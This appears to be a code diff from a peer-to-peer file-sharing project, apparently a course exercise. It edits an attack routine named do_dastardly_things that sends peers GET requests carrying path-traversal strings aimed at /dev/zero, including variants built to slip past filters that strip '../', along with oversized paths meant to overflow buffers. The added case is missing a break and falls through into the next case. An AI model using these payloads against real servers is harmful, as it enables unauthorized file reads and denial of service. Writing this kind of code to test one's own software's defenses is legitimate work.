@@ -923,18 +923,20 @@ void do_dastardly_things(task_t *tracker_task)
 			}
 
 			// Pick a path to attack with and connect to the peer and write the GET command
-			switch(rand() % 4)
+			switch(rand() % 5)
 			{
 				case 0:
-					// Use an absolute path to /dev/zero with an "escaped" first slash
-					osp2p_writef(t->peer_fd, "GET %s OSP2P\n", "\\/////////dev/zero");
+					// Use an absolute path to /dev/zero to confuse single slash checks and replaces
+					osp2p_writef(t->peer_fd, "GET %s OSP2P\n", "/////////dev/zero");
 					break;
 				case 1:
-					// "escape" ../ paths to confuse defenses that simply check paths for "../" literal
-					osp2p_writef(t->peer_fd, "GET %s OSP2P\n",
-					"\\.\\.\\/\\.\\.\\/\\.\\.\\/\\.\\.\\/\\.\\.\\/\\.\\.\\/\\.\\.\\/\\.\\.\\/dev/zero");
+					// Use ../ paths to get to /dev/zero
+					osp2p_writef(t->peer_fd, "GET %s OSP2P\n", "../../../../../../../../dev/zero");
 					break;
 				case 2:
+					// Attemp to defeat defenses that simply remove instances of "../" which would reveal other "../" paths
+					osp2p_writef(t->peer_fd, "GET %s OSP2P\n", ".../...//.../...//.../...//.../...//.../...//.../...//dev/zero");
+				case 3:
 				{
 					// Write a huge filepath to overflow some buffers.
 					// String is over 1024 chars, so it won't land on a power of 2 boundary
@@ -947,7 +949,7 @@ void do_dastardly_things(task_t *tracker_task)
 					osp2p_writef(t->peer_fd, "GET %s OSP2P\n", attack_buffer);
 					break;
 				}
-				case 3:
+				case 4:
 				default:
 				{
 					// Ditto but with nulls instead
